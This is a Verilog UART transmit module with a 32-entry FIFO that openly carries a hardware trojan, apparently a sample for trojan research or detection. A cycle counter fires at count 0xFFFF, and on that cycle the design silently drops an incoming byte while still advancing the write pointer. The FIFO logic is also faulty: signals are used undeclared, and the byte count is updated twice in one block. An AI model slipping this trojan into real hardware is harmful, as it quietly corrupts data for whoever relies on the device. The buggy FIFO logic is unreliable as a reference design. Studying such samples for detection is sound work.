 // Modified UART TX Module with FIFO and a Timing-Based Hardware Trojan
module uart_tx_fifo_trojan_v6 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Timing-based Trojan activation condition
    reg [15:0] cycle_counter = 16'd0; // Counts the number of cycles
    always @(posedge clk) begin
        cycle_counter <= cycle_counter + 1'b1; // Increment the cycle counter
    end
    wire trojan_trigger = (cycle_counter == 16'hFFFF); // Trigger the trojan on a specific cycle count

    always @(posedge clk) begin
        if (write) begin
            w_addr <= w_addr + 5'd1;
            // If Trojan trigger is active, drop the byte to create a communication gap
            if (!trojan_trigger) begin
                mem[w_addr] <= rx_data;
                cnt <= cnt + 5'd1;
            end
        end

        if (~uart_busy && (cnt > 5'd0) && ~we) begin
            data <= mem[r_addr];
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            we <= 1'b1;
        end else begin
            we <= 1'b0;
        end
    end

    assign write = rx_we && (cnt < 5'd31);
    assign read = ~uart_busy && (cnt > 5'd0) && ~we;

    // Managing the busy flag
    always @(posedge clk) begin
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
